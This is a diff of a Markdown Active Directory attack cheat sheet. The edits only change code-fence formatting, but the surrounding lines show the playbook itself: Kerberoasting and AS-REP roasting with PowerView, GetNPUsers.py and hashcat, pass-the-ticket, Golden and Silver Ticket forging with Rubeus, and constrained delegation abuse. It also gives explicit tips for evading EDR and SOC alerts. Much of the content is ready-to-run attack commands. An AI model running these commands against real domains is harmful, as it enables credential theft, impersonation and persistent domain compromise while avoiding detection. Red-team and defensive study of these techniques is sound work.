@@ -10,9 +10,9 @@
 
 _Goal: Request TGS tickets for SPN-enabled accounts and crack them offline. Emphasize native methods or AES-bypasses to evade EDR._
 
-PowerShell
 
-```
+
+```powershell
 # [Native LotL] Stealth enumeration using PowerView
 Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
 
@@ -29,9 +29,9 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 
 **Offline Cracking:**
 
-Bash
 
-```
+
+```bash
 hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule --force
 ```
 
@@ -41,9 +41,8 @@ hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule --force
 
 _Goal: Request an AS-REP ticket for accounts with `Do not require Kerberos preauthentication` enabled. Requires zero initial privileges—just network access._
 
-PowerShell
 
-```
+```Powershell
 # [Native LotL] Find vulnerable accounts via PowerView
 Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
 
@@ -56,9 +55,9 @@ GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asr
 
 **Offline Cracking:**
 
-Bash
 
-```
+
+```bash
 hashcat -m 18200 asrep_hashes.txt wordlist.txt
 ```
 
@@ -68,9 +67,9 @@ hashcat -m 18200 asrep_hashes.txt wordlist.txt
 
 _Goal: Inject a stolen or forged Kerberos ticket into the current LUID (Logon Session) to impersonate another user without touching the disk._
 
-PowerShell
 
-```
+
+```PowerShell
 # View current tickets in memory
 klist
 
@@ -92,9 +91,8 @@ _Goal: Forge a TGT using the compromised `krbtgt` hash for complete, persistent 
 
 > **OPSEC Rule:** Always use AES-256 instead of RC4 if possible. RC4 Golden Tickets trigger immediate alerts in modern SOCs.
 
-PowerShell
 
-```
+```PowerShell
 # Forge AES-256 Golden Ticket and inject into memory
 .\Rubeus.exe golden /aes256:KRBTGT_AES_KEY /domain:domain.local /sid:DOMAIN_SID /user:Administrator /ptt
 
@@ -109,9 +107,9 @@ PowerShell
 
 _Goal: Forge a TGS for a specific service using the compromised machine or service account hash. Does not require DC communication._
 
-PowerShell
 
-```
+
+```PowerShell
 # Forge AES-256 Silver Ticket for the CIFS service (File Share / WMI / PSRemoting access)
 .\Rubeus.exe silver /aes256:SERVICE_AES_KEY /domain:domain.local /sid:DOMAIN_SID /user:Administrator /service:cifs/target.domain.local /ptt
 
@@ -124,9 +122,8 @@ PowerShell
 
 _Goal: Abuse an account with Constrained Delegation to impersonate ANY user to the allowed service._
 
-PowerShell
 
-```
+```PowerShell
 # Step 1: Request a TGT for the service account you control
 .\Rubeus.exe asktgt /user:websvc /aes256:AES_KEY /outfile:tgt.kirbi
 
